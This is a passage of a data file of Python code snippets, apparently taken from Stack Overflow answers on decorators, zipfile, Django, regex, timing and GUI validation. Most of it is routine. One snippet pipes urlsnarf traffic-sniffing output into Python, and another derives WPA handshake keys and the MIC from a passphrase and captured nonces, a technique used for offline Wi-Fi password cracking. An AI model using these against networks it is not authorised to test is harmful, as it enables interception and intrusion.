    print a,b,c
</snippet></ROW><ROW><id>12032434</id><snippet>/*
  Calling scheme used for binary operations:

  v     w       Action
  -------------------------------------------------------------------
  new   new     w.op(v,w)[*], v.op(v,w), w.op(v,w)
  new   old     v.op(v,w), coerce(v,w), v.op(v,w)
  old   new     w.op(v,w), coerce(v,w), v.op(v,w)
  old   old     coerce(v,w), v.op(v,w)

  [*] only when v-&gt;ob_type != w-&gt;ob_type &amp;&amp; w-&gt;ob_type is a subclass of
      v-&gt;ob_type

  Legend:
  -------
  * new == new style number
  * old == old style number
  * Action indicates the order in which operations are tried until either
    a valid result is produced or an error occurs.

 */
</snippet></ROW><ROW><id>12032458</id><snippet>&gt;&gt;&gt; 'Vui lòng giúp đỡ tôi'
'Vui l\xc3\xb2ng gi\xc3\xbap \xc4\x91\xe1\xbb\xa1 t\xc3\xb4i'
&gt;&gt;&gt; 'Vui lòng giúp đỡ tôi'.decode('utf-8')
u'Vui l\xf2ng gi\xfap \u0111\u1ee1 t\xf4i'
&gt;&gt;&gt; print 'Vui lòng giúp đỡ tôi'.decode('utf-8')
Vui lòng giúp đỡ tôi
</snippet></ROW><ROW><id>12032529</id><snippet>self.Name = '%s %s' % (self.Firstname, self.Lastname),
</snippet></ROW><ROW><id>12032529</id><snippet>self.Name = '%s %s' % (self.Firstname, self.Lastname)
</snippet></ROW><ROW><id>12032529</id><snippet>self.Name = 'foo',</snippet></ROW><ROW><id>12032529</id><snippet>self.Name = 'foo'</snippet></ROW><ROW><id>12032529</id><snippet>'foo',</snippet></ROW><ROW><id>12032529</id><snippet>'foo'</snippet></ROW><ROW><id>12032548</id><snippet>self.func</snippet></ROW><ROW><id>12032548</id><snippet>self.func()</snippet></ROW><ROW><id>12032548</id><snippet>return self.func()</snippet></ROW><ROW><id>12032548</id><snippet>with</snippet></ROW><ROW><id>12032548</id><snippet>__call__</snippet></ROW><ROW><id>12032548</id><snippet>func</snippet></ROW><ROW><id>12032548</id><snippet>dictionary</snippet></ROW><ROW><id>12032548</id><snippet>word</snippet></ROW><ROW><id>12032548</id><snippet>@Deco</snippet></ROW><ROW><id>12032548</id><snippet>Deco</snippet></ROW><ROW><id>12032548</id><snippet>Vocab.dictionary</snippet></ROW><ROW><id>12032548</id><snippet>Deco</snippet></ROW><ROW><id>12032548</id><snippet>Vocab().dictionary()</snippet></ROW><ROW><id>12032548</id><snippet>__call__</snippet></ROW><ROW><id>12032548</id><snippet>Deco</snippet></ROW><ROW><id>12032548</id><snippet>dictionary</snippet></ROW><ROW><id>12032548</id><snippet>__call__</snippet></ROW><ROW><id>12032548</id><snippet>dictionary</snippet></ROW><ROW><id>12032548</id><snippet>dictionary</snippet></ROW><ROW><id>12032548</id><snippet>self.func()</snippet></ROW><ROW><id>12032548</id><snippet>dictionary</snippet></ROW><ROW><id>12032597</id><snippet>key = 0

while True:
    try:
        tweet_reddit_post(key)
        break
    except:
        key += 1
</snippet></ROW><ROW><id>12032604</id><snippet>b</snippet></ROW><ROW><id>12032604</id><snippet>c</snippet></ROW><ROW><id>12032604</id><snippet>a</snippet></ROW><ROW><id>12032604</id><snippet>a</snippet></ROW><ROW><id>12032604</id><snippet>a.__code__.co_consts</snippet></ROW><ROW><id>12032604</id><snippet>exec</snippet></ROW><ROW><id>12033033</id><snippet>not nums</snippet></ROW><ROW><id>12033033</id><snippet>for</snippet></ROW><ROW><id>12033033</id><snippet>max(nums) == n</snippet></ROW><ROW><id>12033033</id><snippet>False</snippet></ROW><ROW><id>12033033</id><snippet>gt()</snippet></ROW><ROW><id>12033033</id><snippet>def gt(nums, n):
    if not nums:
        return False
    return max(nums) &gt; n
</snippet></ROW><ROW><id>12033033</id><snippet>&gt;&gt;&gt; import timeit
&gt;&gt;&gt; all = """l = list(range(100))
... rl = list(reversed(range(100)))
... """
&gt;&gt;&gt; tim = all + """def gt(nums, n):
...     if not nums:
...         return False
...     return max(nums) &gt; n"""
&gt;&gt;&gt; gnibbler = all + """def gt(nums, n):
...     return any(x&gt;n for x in nums)"""
&gt;&gt;&gt; burhan = all + """def gt(nums, n):
...   return max(nums) &gt; n if nums else False"""
&gt;&gt;&gt; # Test with the condition being False:
... timeit.timeit(setup=tim, stmt="gt(l, 100)")
3.011574096311698
&gt;&gt;&gt; timeit.timeit(setup=gnibbler, stmt="gt(l, 100)")
8.00847921677337
&gt;&gt;&gt; timeit.timeit(setup=burhan, stmt="gt(l, 100)")
2.9805757305956178
&gt;&gt;&gt; timeit.timeit(setup=tim, stmt="gt(rl, 100)")
2.8600606448831307
&gt;&gt;&gt; timeit.timeit(setup=gnibbler, stmt="gt(l, 100)")
7.997938412127745
&gt;&gt;&gt; timeit.timeit(setup=burhan, stmt="gt(l, 100)")
3.032805185133668
&gt;&gt;&gt; # Now what if the condition is True?
... timeit.timeit(setup=tim, stmt="gt(l, 98)")
2.98623750798793
&gt;&gt;&gt; timeit.timeit(setup=gnibbler, stmt="gt(l, 98)")
8.265056412191534
&gt;&gt;&gt; timeit.timeit(setup=burhan, stmt="gt(l, 98)")
2.9731271156252888
&gt;&gt;&gt; timeit.timeit(setup=tim, stmt="gt(rl, 98)")
2.8777295865334764
&gt;&gt;&gt; timeit.timeit(setup=gnibbler, stmt="gt(rl, 98)")
1.0481696827076092
&gt;&gt;&gt; timeit.timeit(setup=burhan, stmt="gt(rl, 98)")
2.8776150752220246
</snippet></ROW><ROW><id>12033033</id><snippet>True</snippet></ROW><ROW><id>12034023</id><snippet>00:59:00
01:01:00
</snippet></ROW><ROW><id>12034023</id><snippet>01:00:00</snippet></ROW><ROW><id>12034023</id><snippet>HH:MM:SS</snippet></ROW><ROW><id>12034023</id><snippet>00:59:00 -&gt; 3540 seconds
01:01:00 -&gt; 3660 seconds
            ============
average:    3600 seconds converted to HH:MM:SS -&gt; 01:00:00
</snippet></ROW><ROW><id>12034043</id><snippet>description of target</snippet></ROW><ROW><id>12034043</id><snippet>description of target</snippet></ROW><ROW><id>12034043</id><snippet>AY942707</snippet></ROW><ROW><id>12034043</id><snippet>description of target</snippet></ROW><ROW><id>12034043</id><snippet>read_table</snippet></ROW><ROW><id>12034047</id><snippet>class EventHandler(pyinotify.ProcessEvent):
    endGame = False   # Here class attribute "endGame" is declared

    def process_IN_OPEN(self, event):
        print "Opening:", event.pathname
        endGame = True  # Here !local variable! is defined process_IN_OPEN
</snippet></ROW><ROW><id>12034047</id><snippet>process_IN_OPEN</snippet></ROW><ROW><id>12034047</id><snippet>EventHandler</snippet></ROW><ROW><id>12034047</id><snippet>self.endGame = True
</snippet></ROW><ROW><id>12034330</id><snippet>replace</snippet></ROW><ROW><id>12034330</id><snippet>replace = {"Test":"TEST"}</snippet></ROW><ROW><id>12034330</id><snippet>replace()</snippet></ROW><ROW><id>12034330</id><snippet>replace</snippet></ROW><ROW><id>12034416</id><snippet>pip freeze &gt; requirements.txt
</snippet></ROW><ROW><id>12034416</id><snippet>virtualenv --no-site-packages prod_env
</snippet></ROW><ROW><id>12034416</id><snippet>virtualenv</snippet></ROW><ROW><id>12034416</id><snippet>--no-site-packages</snippet></ROW><ROW><id>12034416</id><snippet>source prod_env/bin/activate
pip install -r requirements.txt
</snippet></ROW><ROW><id>12034416</id><snippet>requirements.txt</snippet></ROW><ROW><id>12034416</id><snippet>pip install -r requirements.txt</snippet></ROW><ROW><id>12034416</id><snippet>pip install</snippet></ROW><ROW><id>12034510</id><snippet>subprocess</snippet></ROW><ROW><id>12034510</id><snippet>import subprocess

p = subprocess.Popen('urlsnarf', stdout = subprocess.PIPE)
try:
    while True:
        l = p.stdout.readline()
        # ...
finally:
    p.terminate()
</snippet></ROW><ROW><id>12034510</id><snippet>mkfifo /home/youruser/tmp/urlsnarf-pipe
chown youruser /home/youruser/tmp/urlsnarf-pipe
urlsnarf &gt; /home/youruser/tmp/urlsnarf-pipe
</snippet></ROW><ROW><id>12034510</id><snippet>f = open('/home/youruser/tmp/urlsnarf-pipe', 'r')
while True:
    l = f.readline()
    # ...
</snippet></ROW><ROW><id>12034745</id><snippet>mgrid</snippet></ROW><ROW><id>12034745</id><snippet>x, y = np.broadcast_arrays(*np.ogrid[0:2,0:3])
</snippet></ROW><ROW><id>12034745</id><snippet>x</snippet></ROW><ROW><id>12034745</id><snippet>y</snippet></ROW><ROW><id>12034745</id><snippet>np.arange(0,2)</snippet></ROW><ROW><id>12034745</id><snippet>np.arange(0,3)</snippet></ROW><ROW><id>12034791</id><snippet>logging.disable</snippet></ROW><ROW><id>12034791</id><snippet>logging.disable(logging.NOTSET)</snippet></ROW><ROW><id>12034791</id><snippet>logging</snippet></ROW><ROW><id>12034791</id><snippet>logging.shutdown()
reload(logging)
</snippet></ROW><ROW><id>12034791</id><snippet>logging</snippet></ROW><ROW><id>12034838</id><snippet>from datetime import datetime

tick = datetime.now()

# run tests

tock = datetime.now()   
diff = tick - tock    # the result is a datetime.timedelta object
print(diff.seconds)
</snippet></ROW><ROW><id>12035003</id><snippet>include</snippet></ROW><ROW><id>12035003</id><snippet>require</snippet></ROW><ROW><id>12035481</id><snippet>start_requests()</snippet></ROW><ROW><id>12035481</id><snippet>class MySpider(CrawlSpider):

    name = "spider"
    allowed_domains = ["www.domain.com"]

    def start_requests(self):
        # querying the database here...

        #getting the urls from the database and assigning them to the rows list
        rows = cur.fetchall()

        for url, ... in rows:
            yield self.make_requests_from_url(url)


    def parse(self, response):
        hxs = HtmlXPathSelector(response)
        sites = hxs.select("a bunch of xpaths here...")

        for site in sites:
            item = SettingsItem()
            # a bunch of items and their xpaths...
            # here is my non-working code
            item['url_item'] = response.url

            yield item
</snippet></ROW><ROW><id>12035534</id><snippet>pattern = r"a='(.*?)'"
</snippet></ROW><ROW><id>12035534</id><snippet>(?&lt;=a=')[^']*(?=')</snippet></ROW><ROW><id>12035534</id><snippet>#!/usr/bin/python

import re

text = "a='one' b='2' c='3' a='two' b='8' c='3'"
pattern = r"a='(.*?)'"

for m in re.findall( pattern, text ):
  print m
</snippet></ROW><ROW><id>12035890</id><snippet>import ssh
import os

s = ssh.Connection(host = 'ipaddress', username = 'server1', password = 'xxxx') 
os.system("python signmes1.py")
</snippet></ROW><ROW><id>12035946</id><snippet>self._Thread__target
</snippet></ROW><ROW><id>12035946</id><snippet>_Thread</snippet></ROW><ROW><id>12035946</id><snippet>_SpecificThread</snippet></ROW><ROW><id>12035946</id><snippet>Thread</snippet></ROW><ROW><id>12036202</id><snippet>zipfile</snippet></ROW><ROW><id>12036202</id><snippet>import zipfile

for filename in [ 'README.txt', 'example.zip', 
                  'bad_example.zip', 'notthere.zip' ]:
    print '%20s  %s' % (filename, zipfile.is_zipfile(filename))
</snippet></ROW><ROW><id>12036202</id><snippet>import datetime
import zipfile

def print_info(archive_name):
    zf = zipfile.ZipFile(archive_name)
    for info in zf.infolist():
        print info.filename
        print '\tComment:\t', info.comment
        print '\tModified:\t', datetime.datetime(*info.date_time)
        print '\tSystem:\t\t', info.create_system, '(0 = Windows, 3 = Unix)'
        print '\tZIP version:\t', info.create_version
        print '\tCompressed:\t', info.compress_size, 'bytes'
        print '\tUncompressed:\t', info.file_size, 'bytes'
        print

if __name__ == '__main__':
    print_info('example.zip')
</snippet></ROW><ROW><id>12036213</id><snippet>{% url %}</snippet></ROW><ROW><id>12036216</id><snippet>wx.SingleInstanceChecker</snippet></ROW><ROW><id>12036216</id><snippet>import wx

class SingleAppFrame(wx.Frame):
    def __init__(self, parent, title):
        wx.Frame.__init__(self, parent, title=title, size=(300, 300))
        self.Centre()


class SingleApp(wx.App):
    def OnInit(self):
        self.name = "SingleApp-%s" % wx.GetUserId()
        self.instance = wx.SingleInstanceChecker(self.name)
        if self.instance.IsAnotherRunning():
            wx.MessageBox("Another instance is running", "ERROR")
                return False
       frame = SingleAppFrame(None, "SingleApp")
       frame.Show()
       return True


app = SingleApp(redirect=False)
app.MainLoop()
</snippet></ROW><ROW><id>12036331</id><snippet>options = doc.xpath("//select[@name='country']/option")
option_text = [option.text for option in options]
</snippet></ROW><ROW><id>12036601</id><snippet>__init__</snippet></ROW><ROW><id>12036601</id><snippet>getargspec</snippet></ROW><ROW><id>12036601</id><snippet>getargspec</snippet></ROW><ROW><id>12036601</id><snippet>import inspect

class AttributeInitType(type):        
    def __call__(self, *args, **kwargs):
        obj = super(AttributeInitType, self).__call__(*args, **kwargs)
        argspec = inspect.getargspec(obj.__init__)
        defaults = dict(zip(argspec.args[-len(argspec.defaults):], argspec.defaults))
        defaults.update(kwargs)
        for key, val in defaults.items():
            setattr(obj, key, val)
        return obj
</snippet></ROW><ROW><id>12036601</id><snippet>&gt;&gt;&gt; man = Human()
&gt;&gt;&gt; man.age
0
&gt;&gt;&gt; man.height
160
&gt;&gt;&gt; Human(height=180).height
180
</snippet></ROW><ROW><id>12036695</id><snippet>import sys
sys.exit(-1)
</snippet></ROW><ROW><id>12036715</id><snippet>except (RuntimeError, TypeError, NameError) as e:
</snippet></ROW><ROW><id>12036834</id><snippet>tastypie</snippet></ROW><ROW><id>12036834</id><snippet># urls.py
# =======
from django.conf.urls.defaults import *
from tastypie.api import Api
from myapp.api import EntryResource

v1_api = Api(api_name='v1')
v1_api.register(EntryResource())

urlpatterns = patterns('',
    # The normal jazz here then...
    (r'^api/', include(v1_api.urls)),
)
</snippet></ROW><ROW><id>12036861</id><snippet>SSH</snippet></ROW><ROW><id>12036861</id><snippet>toolserv</snippet></ROW><ROW><id>12036861</id><snippet>gnupg</snippet></ROW><ROW><id>12036861</id><snippet>s = ssh.Connection(host = 'ipaddress', username = 'toolserv', password = 'xxxx')</snippet></ROW><ROW><id>12036861</id><snippet>ipaddress</snippet></ROW><ROW><id>12036861</id><snippet>/home/toolserv/.gnupg</snippet></ROW><ROW><id>12036956</id><snippet>import oauth
import httplib

URL='http://localhost:5984/_session'
CONSUMER_KEY = 'example.com'
CONSUMER_SECRET = 'sekr1t'
TOKEN='user1'
SECRET='tokensekr1t'

consumer = oauth.OAuthConsumer(CONSUMER_KEY, CONSUMER_SECRET)
token = oauth.OAuthToken(TOKEN, SECRET)
req = oauth.OAuthRequest.from_consumer_and_token(
    consumer, token=token, http_method='GET', http_url=URL, parameters={}
)
req.sign_request(oauth.OAuthSignatureMethod_HMAC_SHA1(), consumer,token)

con = httplib.HTTPConnection('localhost', 5984)
con.request('GET', URL,headers=req.to_header())
print con.getresponse().read()
</snippet></ROW><ROW><id>12037328</id><snippet>rb</snippet></ROW><ROW><id>12037328</id><snippet>r</snippet></ROW><ROW><id>12037328</id><snippet>wb</snippet></ROW><ROW><id>12037328</id><snippet>w</snippet></ROW><ROW><id>12037328</id><snippet>rb</snippet></ROW><ROW><id>12037328</id><snippet>\r\n</snippet></ROW><ROW><id>12037328</id><snippet>r</snippet></ROW><ROW><id>12037328</id><snippet>\n</snippet></ROW><ROW><id>12037328</id><snippet>data = open(in_filename,'r').read()
out_file = open(out_filename,'w')
</snippet></ROW><ROW><id>12037328</id><snippet>data = open(in_filename,'rb').read()
out_file = open(out_filename,'wb')
</snippet></ROW><ROW><id>12037382</id><snippet>user = models.OneToOneField(User, null=True, blank=True)</snippet></ROW><ROW><id>12037382</id><snippet>class UserExtraInfo(User):
#here your extra fields
</snippet></ROW><ROW><id>12037410</id><snippet>if not (m &amp; 1)</snippet></ROW><ROW><id>12037410</id><snippet>if ~(m &amp; 1)</snippet></ROW><ROW><id>12037410</id><snippet>false</snippet></ROW><ROW><id>12037410</id><snippet>~</snippet></ROW><ROW><id>12037410</id><snippet>~x == -x-1</snippet></ROW><ROW><id>12037762</id><snippet>re.sub("(?&lt;=[^a-zA-Z])pi(?=[^a-zA-Z])", "(math.pi)", "2pi3 + supirse")</snippet></ROW><ROW><id>12037995</id><snippet>c</snippet></ROW><ROW><id>12037995</id><snippet>class SomeClass:
     def foo(self, a=None, b=None):
        if a and b:
            c = a + b
            self.stored_c = c
            return c
        return self.stored_c
</snippet></ROW><ROW><id>12037995</id><snippet>stored_c</snippet></ROW><ROW><id>12038062</id><snippet>$ python setup.py bdist --format=rpm
$ rpm -i dist/$PACKAGE.rpm
</snippet></ROW><ROW><id>12038390</id><snippet>a2b_hex() #alternatively unhexlify()
</snippet></ROW><ROW><id>12038390</id><snippet>import hmac,hashlib,binascii
passPhrase="10zZz10ZZzZ"
ssid        = "Netgear 2/158"
A           = "Pairwise key expansion"
APmac       = a2b_hex("001e2ae0bdd0")
Clientmac   = a2b_hex("cc08e0620bc8")
ANonce      = a2b_hex("61c9a3f5cdcdf5fae5fd760836b8008c863aa2317022c7a202434554fb38452b")
SNonce      = a2b_hex("60eff10088077f8b03a0e2fc2fc37e1fe1f30f9f7cfbcfb2826f26f3379c4318")
B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce)
data        = a2b_hex("0103005ffe01090020000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")

pmk     = pbkdf2(passPhrase, ssid, 4096, 32) 
ptk     = customPRF512(pmk,A,B)
mic     = hmac.new(ptk[0:16],data)

print "desiredpmk:\t","01b809f9ab2fb5dc47984f52fb2d112e13d84ccb6b86d4a7193ec5299f851c48"
print "pmk:\t\t",b2a_hex(pmk),"\n"
print "desired ptk:\t","bf49a95f0494f44427162f38696ef8b6"
print "ptk:\t\t",b2a_hex(ptk[0:16]),"\n"
print "desired mic:\t","45282522bc6707d6a70a0317a3ed48f0"
print "mic:\t\t",mic.hexdigest(),"\n"
</snippet></ROW><ROW><id>12038744</id><snippet>zf = zipfile.ZipFile(archive_name)
for zinfo in zf.infolist():
    is_encrypted = zinfo.flag_bits &amp; 0x1 
    if is_encrypted:
        print '%s is encrypted!' % zinfo.filename
</snippet></ROW><ROW><id>12038744</id><snippet>try:
    zf.testzip()
except RuntimeError as e:
    if 'encrypted' in str(e):
        print 'Golly, this zip has encrypted files! Try again with a password!'
    else:
        # RuntimeError for other reasons....
</snippet></ROW><ROW><id>12038795</id><snippet> math.atan2(y,x)/math.pi*180
</snippet></ROW><ROW><id>12038978</id><snippet>session.expunge(p1)
</snippet></ROW><ROW><id>12038978</id><snippet>p2 = session.merge(p1)
</snippet></ROW><ROW><id>12039261</id><snippet>with open('datafile') as f:
    for line in f:
        process(line)
</snippet></ROW><ROW><id>12039533</id><snippet>PK\007\008</snippet></ROW><ROW><id>12039533</id><snippet># grep PK /usr/lib/python2.7/zipfile.py 

stringEndArchive = "PK\005\006"
stringCentralDir = "PK\001\002"
stringFileHeader = "PK\003\004"
stringEndArchive64Locator = "PK\x06\x07"
stringEndArchive64 = "PK\x06\x06"
</snippet></ROW><ROW><id>12039547</id><snippet>import urllib2
proxy = urllib2.ProxyHandler({'https': '127.0.0.1:8081'})
opener = urllib2.build_opener(proxy)
urllib2.unstall_opener(opener)
print urllib2.urlopen('https://www.google.com').read()
</snippet></ROW><ROW><id>12039764</id><snippet>yourList.sort(key=lambda x: x[1], reverse=True)</snippet></ROW><ROW><id>12039958</id><snippet>render_to_response</snippet></ROW><ROW><id>12039958</id><snippet>render_to_response</snippet></ROW><ROW><id>12039958</id><snippet>simplejson.dumps()</snippet></ROW><ROW><id>12039980</id><snippet>&gt;&gt;&gt; def x():
...    def y():
...       pass
... 
&gt;&gt;&gt; x
&lt;function x at 0x7f68560295f0&gt;
&gt;&gt;&gt; x.y
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
AttributeError: 'function' object has no attribute 'y'
</snippet></ROW><ROW><id>12039980</id><snippet>&gt;&gt;&gt; def x():
...    def _y():
...       pass
...    x.y = _y
... 
</snippet></ROW><ROW><id>12039980</id><snippet>&gt;&gt;&gt; x.y
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
AttributeError: 'function' object has no attribute 'y'
</snippet></ROW><ROW><id>12039980</id><snippet>&gt;&gt;&gt; x()
&gt;&gt;&gt; x.y
&lt;function _y at 0x1a720c8&gt;
</snippet></ROW><ROW><id>12040096</id><snippet>Q</snippet></ROW><ROW><id>12040096</id><snippet>INNER_JOIN</snippet></ROW><ROW><id>12040096</id><snippet>WHERE NOT</snippet></ROW><ROW><id>12040096</id><snippet>exclude</snippet></ROW><ROW><id>12040096</id><snippet>nested select</snippet></ROW><ROW><id>12040096</id><snippet>INNER JOIN</snippet></ROW><ROW><id>12040096</id><snippet>NULL</snippet></ROW><ROW><id>12040096</id><snippet>foreign_key</snippet></ROW><ROW><id>12040096</id><snippet>target_call.bought_record_id = NULL</snippet></ROW><ROW><id>12040225</id><snippet>dict(zip(hdr, elt))["c"]
</snippet></ROW><ROW><id>12040225</id><snippet>elt[hdr.index("c")]
</snippet></ROW><ROW><id>12040225</id><snippet>dict</snippet></ROW><ROW><id>12040510</id><snippet>#!/usr/bin/env python

import glob
import shutil
import os

source="."
destination = "/tmp/newDestination/"

if not(os.path.exists(destination)):
    os.makedirs(destination)
elif not(os.path.isdir(destination)):
    raise OSError("Kabooom! The destination %s exists, but is not a directory" % destination)

for javaFile in glob.glob(os.path.join(source, "*.java")):
    if os.path.isfile(javaFile):
        shutil.move(os.path.abspath(javaFile), destination)
</snippet></ROW><ROW><id>12040787</id><snippet>{% include "name_snippet.html" with person="Jane" greeting="Hello" %}</snippet></ROW><ROW><id>12040822</id><snippet>slice</snippet></ROW><ROW><id>12040822</id><snippet>pl = pl[:5] # get the first five elements.
</snippet></ROW><ROW><id>12040822</id><snippet>while len(pl) &gt; 5:
  pl.pop()
</snippet></ROW><ROW><id>12040822</id><snippet>import random
random.sample(range(10), 3)
</snippet></ROW><ROW><id>12040964</id><snippet>img[ix, iy] = dummy
</snippet></ROW><ROW><id>12041023</id><snippet>zip</snippet></ROW><ROW><id>12041023</id><snippet>for x,y,z in zip(l1,l2,l3):
    print x,y,z  #1 4 7
                 #2 5 8
                 #3 6 9
</snippet></ROW><ROW><id>12041023</id><snippet>for f in l1,l2 and l3:
</snippet></ROW><ROW><id>12041023</id><snippet>for f in (l1,l3):</snippet></ROW><ROW><id>12041023</id><snippet>l2 and l3</snippet></ROW><ROW><id>12041023</id><snippet>l3</snippet></ROW><ROW><id>12041023</id><snippet>l2</snippet></ROW><ROW><id>12041023</id><snippet>l3</snippet></ROW><ROW><id>12041023</id><snippet>for lst in (l1,l2,l3):  #parenthesis unnecessary, but I like them...
    print lst   #[ 1, 2, 3 ]
                #[ 4, 5, 6 ]
                #[ 7, 8, 9 ]
</snippet></ROW><ROW><id>12041101</id><snippet>time.sleep(2)</snippet></ROW><ROW><id>12041101</id><snippet>TSocket.py</snippet></ROW><ROW><id>12041101</id><snippet>import socket
</snippet></ROW><ROW><id>12041101</id><snippet>from gevent import socket
</snippet></ROW><ROW><id>12041101</id><snippet>TSocket</snippet></ROW><ROW><id>12041101</id><snippet>open()</snippet></ROW><ROW><id>12041367</id><snippet>my_file = []
with open('file.csv','r') as fi:
    for i, row in enumerate(csv.reader(fi, delimiter=',', skipinitialspace=True)):
         if i % 3 == 2:
             my_file.append(row)
         else:
             my_file.append(row[:-3])

#if you want to save a new csv file
with open('new_file.csv', 'wb') as new_fi:
    new_fi_writer = csv.writer(new_fi, delimiter=', ')
    for line in my_file:
        new_fi_writer.writerow(line)

#alternatively (if you just want to print the lines)
for line in my_file:
    print ' '.join(line)
</snippet></ROW><ROW><id>12041483</id><snippet>izip_longest</snippet></ROW><ROW><id>12041483</id><snippet>itertools</snippet></ROW><ROW><id>12041483</id><snippet>from itertools import izip_longest # in py3, this is renamed zip_longest

def flatten(nested_list):
    return zip(*_flattengen(nested_list)) # in py3, wrap this in list()

def _flattengen(iterable):
    for element in izip_longest(*iterable, fillvalue=""):
        if isinstance(element[0], list):
            for e in _flattengen(element):
                yield e
        else:
            yield element
</snippet></ROW><ROW><id>12041483</id><snippet>for e in _flatengen(element): yield e</snippet></ROW><ROW><id>12041483</id><snippet>yield from _flattengen(element)</snippet></ROW><ROW><id>12041508</id><snippet>keys()</snippet></ROW><ROW><id>12041508</id><snippet>__getitem__</snippet></ROW><ROW><id>12041508</id><snippet>class A:
    def __init__(self, data):
        self.data = data
    def keys(self):
        return self.data.keys()
    def __getitem__(self, key):
        return self.data[key]

def f(alpha):
    print alpha

f(**A({'alpha': 2}))
</snippet></ROW><ROW><id>12041508</id><snippet>dict.update()</snippet></ROW><ROW><id>12041508</id><snippet>collections.Mapping</snippet></ROW><ROW><id>12041508</id><snippet>class A(Mapping):
    def __init__(self, data):
        self.data = data

    def __iter__(self):
        return iter(self.data)

    def __len__(self):
        return len(self.data)

    def __getitem__(self, key):
        return self.data[key]
</snippet></ROW><ROW><id>12041606</id><snippet>sys.executable</snippet></ROW><ROW><id>12041606</id><snippet>&gt;&gt;&gt; import sys
&gt;&gt;&gt; import os
&gt;&gt;&gt; sys.executable
'/usr/bin/python'
</snippet></ROW><ROW><id>12041606</id><snippet>&gt;&gt;&gt; os.path.splitdrive(sys.executable)
('', '/usr/bin/python')
</snippet></ROW><ROW><id>12041620</id><snippet>GROUP BY</snippet></ROW><ROW><id>12041620</id><snippet>IN static_set</snippet></ROW><ROW><id>12041620</id><snippet>GroupMembers</snippet></ROW><ROW><id>12041620</id><snippet>MEMBERSHIP_QUERY = '''
    SELECT gm.group, mc.memberscount = %(len)s AS type
      FROM groupmembers gm
      JOIN (SELECT "group", COUNT(DISTINCT members) as memberscount 
              FROM groupmembers
             GROUP BY "group") mc
      ON gm.group = mc.group
    WHERE gm.members IN %(set)s
    GROUP BY gm.group, mc.memberscount
    HAVING COUNT(DISTINCT gm.members) = %(len)s;
'''

def membership(members):
    # obtain a cursor
    for row in cursor.execute(MEMBERSHIP_QUERY, dict(len=len(members), set=members)):
        yield dict(group=row[0], type=row[1])
</snippet></ROW><ROW><id>12041620</id><snippet>.executemany()</snippet></ROW><ROW><id>12041620</id><snippet>members = ['Alice', 'Bob']
cursor.execute('CREATE TEMP TABLE tmp_members (member CHAR(255)) ON COMMIT DROP;')
cursor.executemany('INSERT INTO tmp_members VALUES (%s);',
    [(name,) for name in members])
</snippet></ROW><ROW><id>12041620</id><snippet>.executemany()</snippet></ROW><ROW><id>12041620</id><snippet>%(name)s</snippet></ROW><ROW><id>12041620</id><snippet>[dict(name=name) for name in members]</snippet></ROW><ROW><id>12041671</id><snippet>newlist = []
for index, item in enumerate(timelist):
    if index % 24 == 0:
        newlist.append(item)
    else:
        newlist.append('')
ax.set_xticklabels(newlist, rotation=17)
</snippet></ROW><ROW><id>12041954</id><snippet>self.s.send('MODE #channel +o Example\r\n')
</snippet></ROW><ROW><id>12041998</id><snippet>validatecommand</snippet></ROW><ROW><id>12041998</id><snippet>validate</snippet></ROW><ROW><id>12041998</id><snippet>validate</snippet></ROW><ROW><id>12041998</id><snippet>"key"</snippet></ROW><ROW><id>12041998</id><snippet>import Tkinter as tk

class SampleApp(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        # define a command to be called by the validation code.  %P
        # represents the value of the entry widget if the edit is
        # allowed. We want that passed in to our validation comman so
        # we can validate it. For more information see
        # http://tcl.tk/man/tcl8.5/TkCmd/entry.htm#M7
        vcmd = (self.register(self._validate), '%P')
        e = tk.Entry(self, validate="key", validatecommand=vcmd)
        e.pack()

    def _validate(self, P):
        # accept the empty string, "." or "-." (to make it possible to
        # enter something like "-.1"), or any string that can be
        # converted to a floating point number.
        try:
            if P in (".", "-", "-.", ""):
                return True
            n = float(P)
            return True
        except:
            self.bell()
            return False

app=SampleApp()
app.mainloop()
</snippet></ROW><ROW><id>12041998</id><snippet>[tkinter] validatecommand</snippet></ROW><ROW><id>12042115</id><snippet>func</snippet></ROW><ROW><id>12042115</id><snippet>lambda</snippet></ROW><ROW><id>12042115</id><snippet># Any
contains = any(func(x) for x in enumerable)

# Count
count = sum(func(x) for x in enumerable)

# Distinct: since we are using a custom comparer here, we need a loop to keep 
# track of what has been seen already
distinct = []
seen = set()
for x in enumerable:
    comp = comparer(x)
    if not comp in seen:
        seen.add(comp)
        distinct.append(x)

# First
element = next(iter(enumerable))

# Except
except_ = [x for x in enumerable if not comparer(x) in other]
</snippet></ROW><ROW><id>12042115</id><snippet>any()</snippet></ROW><ROW><id>12042115</id><snippet>sum()</snippet></ROW><ROW><id>12042115</id><snippet>set</snippet></ROW><ROW><id>12042115</id><snippet>lambda</snippet></ROW><ROW><id>12042115</id><snippet>func</snippet></ROW><ROW><id>12042115</id><snippet>lambda</snippet></ROW><ROW><id>12042115</id><snippet>except</snippet></ROW><ROW><id>12042115</id><snippet>except_</snippet></ROW><ROW><id>12042115</id><snippet>map()</snippet></ROW><ROW><id>12042333</id><snippet>&gt;&gt;&gt; import networkx as nx
&gt;&gt;&gt; G = nx.DiGraph()
&gt;&gt;&gt; G.add_edges_from([('n', 'n1'), ('n', 'n2'), ('n', 'n3')])
&gt;&gt;&gt; G.add_edges_from([('n4', 'n41'), ('n1', 'n11'), ('n1', 'n12'), ('n1', 'n13')])
&gt;&gt;&gt; G.add_edges_from([('n2', 'n21'), ('n2', 'n22')])
&gt;&gt;&gt; G.add_edges_from([('n13', 'n131'), ('n22', 'n221')])
&gt;&gt;&gt; G.add_edges_from([('n131', 'n221'), ('n221', 'n131')]
&gt;&gt;&gt; G.add_node('n5')
</snippet></ROW><ROW><id>12042333</id><snippet>&gt;&gt;&gt; [k for k,v in G.out_degree().iteritems() if v &gt; 0]
['n13', 'n', 'n131', 'n1', 'n22', 'n2', 'n221', 'n4']
</snippet></ROW><ROW><id>12042333</id><snippet>&gt;&gt;&gt; [k for k,v in G.out_degree().iteritems() if v == 0]
['n12', 'n11', 'n3', 'n41', 'n21', 'n5']
</snippet></ROW><ROW><id>12042333</id><snippet>&gt;&gt;&gt; [k for k,v in G.degree().iteritems() if v == 0]
['n5']
